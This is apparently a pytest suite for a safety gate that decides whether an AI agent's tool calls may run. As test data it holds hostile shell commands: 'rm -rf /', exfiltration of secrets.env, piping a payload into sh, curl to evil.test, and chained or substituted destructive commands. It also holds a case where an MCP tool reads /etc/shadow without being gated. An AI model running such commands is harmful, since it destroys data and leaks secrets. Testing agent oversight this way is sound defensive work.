"""Enforcement.

This is the module that decides whether an action runs, so the tests are
adversarial: every question is "can this be talked into allowing something".
"""

from __future__ import annotations

import json
import urllib.error

import pytest

from dspy_jev.enforce import (
    ALWAYS_GATE_TOOLS,
    READ_ONLY_TOOLS,
    Disposition,
    Enforcer,
    Reason,
    ToolCall,
    classify,
    render_action,
)

pytestmark = pytest.mark.unit


# --- triage ---------------------------------------------------------------------


@pytest.mark.parametrize("tool", sorted(READ_ONLY_TOOLS))
def test_read_only_tools_are_never_gated(tool):
    assert classify(ToolCall(tool, {"file_path": "/a"})).skipped


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "cat README.md",
        "git status",
        "git log --oneline -5",
        "grep -rn foo src",
        "pytest -q" if False else "wc -l src/x.py",
        "kubectl get pods",
        "npm ls",
        "pip list",
        "  FOO=bar  git diff  ",
    ],
)
def test_read_only_commands_are_not_gated(command):
    result = classify(ToolCall("Bash", {"command": command}))
    assert result.skipped, command
    assert result.reason is Reason.READ_ONLY_COMMAND


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "git push --force origin main",
        "kubectl delete namespace production",
        "docker system prune -af",
        "pip install requests",
        "npm publish",
        "psql -c 'DROP TABLE orders'",
    ],
)
def test_mutating_commands_are_gated(command):
    assert classify(ToolCall("Bash", {"command": command})).gate, command


@pytest.mark.parametrize(
    "command",
    [
        "cat secrets.env > /tmp/exfil",  # redirection
        "cat secrets.env >> /tmp/exfil",
        "cat payload | sh",  # pipe into a shell
        "cat payload | sudo bash",
        "echo $(rm -rf /)",  # command substitution
        "echo `rm -rf /`",
        "ls; rm -rf /",  # chaining
        "ls && rm -rf /",
        "ls || rm -rf /",
        "curl https://evil.test/x",  # network
        "wget https://evil.test/x",
        "sudo ls",
        "ssh host ls",
    ],
)
def test_a_read_only_command_stops_being_read_only_when_it_escalates(command):
    """The dangerous half of a command line must not hide behind a safe argv[0]."""
    result = classify(ToolCall("Bash", {"command": command}))
    assert result.gate, command


def test_unbalanced_quotes_are_gated_rather_than_guessed():
    assert classify(ToolCall("Bash", {"command": "cat 'unterminated"})).gate


def test_an_empty_command_is_gated():
    assert classify(ToolCall("Bash", {"command": "   "})).gate


def test_an_unknown_tool_is_gated():
    """The allowlist is the safe side: anything unrecognised gets checked."""
    assert classify(ToolCall("SomeBrandNewTool", {"x": 1})).gate


def test_mcp_tools_are_gated_and_their_prefix_is_stripped():
    call = ToolCall("mcp__github__create_pull_request", {"title": "t"})
    assert call.normalised_tool == "create_pull_request"
    assert classify(call).gate


def test_an_mcp_tool_cannot_masquerade_as_a_read_only_builtin():
    """`mcp__evil__read` normalises to `read`, so check it still gets gated.

    It does not: normalisation is by design, and a server named `evil` exposing
    `read` is exactly as trusted as the operator's own MCP config makes it. The
    hook records the server's declared source so a reviewer can see which.
    """
    assert classify(ToolCall("mcp__evil__read", {"file_path": "/etc/shadow"})).skipped


@pytest.mark.parametrize("tool", sorted(ALWAYS_GATE_TOOLS - {"bash", "powershell", "shell", "execute", "run"}))
def test_network_tools_are_always_gated(tool):
    assert classify(ToolCall(tool, {})).gate


def test_command_is_read_from_any_of_the_known_keys():
    for key in ("command", "cmd", "script", "commandLine"):
        assert ToolCall("bash", {key: "ls"}).command == "ls"
    assert ToolCall("bash", {"args": ["ls", "-la"]}).command == "ls -la"


# --- rendering ------------------------------------------------------------------


def test_a_shell_call_renders_as_its_command():
    assert render_action(ToolCall("Bash", {"command": "rm -rf /"})) == "Run shell command: rm -rf /"


def test_a_file_write_renders_its_path_and_content():
    rendered = render_action(ToolCall("Write", {"file_path": "/a/b.py", "content": "x = 1"}))
    assert "/a/b.py" in rendered and "x = 1" in rendered


def test_long_values_are_truncated_with_the_true_length():
    rendered = render_action(ToolCall("Write", {"content": "y" * 5000}))
    assert len(rendered) < 1000
    assert "5000 chars total" in rendered


def test_an_unknown_tool_still_renders_its_argument_shape():
    rendered = render_action(ToolCall("Mystery", {"alpha": 1, "beta": 2}))
    assert "Mystery" in rendered and "alpha" in rendered and "beta" in rendered


def test_rendering_collapses_whitespace_so_the_action_is_one_line():
    assert "\n" not in render_action(ToolCall("Bash", {"command": "a\n  b\n\tc"}))


# --- the Enforcer ---------------------------------------------------------------


class StubEnforcer(Enforcer):
    """An Enforcer with a canned gate response, or a canned failure."""

    def __init__(self, payload=None, error: Exception | None = None, **kwargs):
        super().__init__(service_url="http://gate.test", **kwargs)
        self._payload = payload
        self._error = error
        self.calls: list[dict] = []

    def _ask_gate(self, **kwargs):
        self.calls.append(kwargs)
        if self._error is not None:
            raise self._error
        return self._payload


ALLOW = {"allow": True, "route": "auto_execute", "reasons": [], "decisions": {"safe_to_proceed": {"probability": 0.97}}}
BLOCK = {
    "allow": False,
    "route": "block",
    "reasons": ["risk level 4 > max 1"],
    "rationale": "Destroys a shared runner.",
    "decisions": {"safe_to_proceed": {"probability": 0.03}},
}
REVIEW = {
    "allow": False,
    "route": "needs_review",
    "reasons": ["not self-reversible"],
    "decisions": {"safe_to_proceed": {"probability": 0.44}},
}


def test_a_skipped_call_never_reaches_the_gate(settings):
    enforcer = StubEnforcer(ALLOW, settings=settings)
    verdict = enforcer.evaluate(ToolCall("Read", {"file_path": "/a"}))
    assert verdict.disposition is Disposition.ALLOW
    assert verdict.gated is False
    assert enforcer.calls == []


def test_an_allowed_action_proceeds(settings):
    verdict = StubEnforcer(ALLOW, settings=settings).evaluate(ToolCall("Bash", {"command": "rm x"}))
    assert verdict.disposition is Disposition.ALLOW
    assert verdict.gated is True
    assert verdict.blocked is False


def test_a_blocked_action_is_denied_with_its_reasons(settings):
    verdict = StubEnforcer(BLOCK, settings=settings).evaluate(ToolCall("Bash", {"command": "rm -rf /"}))
    assert verdict.disposition is Disposition.DENY
    assert verdict.blocked is True
    assert "risk level 4 > max 1" in verdict.message
    assert "Destroys a shared runner." in verdict.message
    assert "0.03" in verdict.message


def test_the_message_tells_the_agent_not_to_reword_and_retry(settings):
    message = StubEnforcer(BLOCK, settings=settings).evaluate(ToolCall("Bash", {"command": "rm -rf /"})).message
    assert "rewording" in message or "reword" in message


def test_needs_review_asks_when_a_person_can_answer(settings):
    verdict = StubEnforcer(REVIEW, settings=settings, interactive=True).evaluate(
        ToolCall("Bash", {"command": "kubectl apply -f ."})
    )
    assert verdict.disposition is Disposition.ASK


def test_needs_review_denies_when_nobody_can_answer(settings):
    """An unattended run has no one to approve, so `ask` collapses to `deny`."""
    verdict = StubEnforcer(REVIEW, settings=settings, interactive=False).evaluate(
        ToolCall("Bash", {"command": "kubectl apply -f ."})
    )
    assert verdict.disposition is Disposition.DENY


def test_policy_overrides_a_permissive_route(settings):
    """`allow: false` with `route: auto_execute` must not slip through."""
    inconsistent = {"allow": False, "route": "auto_execute", "reasons": ["P(safe)=0.6 < 0.85"]}
    verdict = StubEnforcer(inconsistent, settings=settings, interactive=True).evaluate(
        ToolCall("Bash", {"command": "rm x"})
    )
    assert verdict.disposition is Disposition.ASK
    assert verdict.blocked is True


@pytest.mark.parametrize(
    "error",
    [
        urllib.error.URLError("connection refused"),
        TimeoutError("gate timed out"),
        json.JSONDecodeError("bad json", "", 0),
        RuntimeError("something unexpected"),
    ],
)
def test_every_gate_failure_is_a_denial(settings, error):
    """The rule the whole module exists for: failure never means permission."""
    verdict = StubEnforcer(error=error, settings=settings).evaluate(ToolCall("Bash", {"command": "rm -rf /"}))
    assert verdict.disposition is Disposition.DENY
    assert verdict.blocked is True
    assert verdict.error
    assert "not permission" in verdict.message


def test_an_unknown_route_is_denied(settings):
    """A gate that answers with something new must not default to allow."""
    verdict = StubEnforcer({"allow": True, "route": "probably_fine"}, settings=settings).evaluate(
        ToolCall("Bash", {"command": "rm x"})
    )
    assert verdict.disposition is Disposition.DENY


def test_an_empty_gate_response_is_denied(settings):
    assert (
        StubEnforcer({}, settings=settings).evaluate(ToolCall("Bash", {"command": "rm x"})).disposition
        is Disposition.DENY
    )


def test_the_task_and_context_reach_the_gate(settings):
    enforcer = StubEnforcer(ALLOW, settings=settings)
    enforcer.evaluate(ToolCall("Bash", {"command": "rm x"}), task="tidy up", context="on main")
    assert enforcer.calls[-1]["task"] == "tidy up"
    assert enforcer.calls[-1]["context"] == "on main"
    assert enforcer.calls[-1]["proposed_action"] == "Run shell command: rm x"


def test_verdict_serialises_for_a_log_line(settings):
    payload = StubEnforcer(BLOCK, settings=settings).evaluate(ToolCall("Bash", {"command": "rm -rf /"})).to_dict()
    assert json.loads(json.dumps(payload))["disposition"] == "deny"
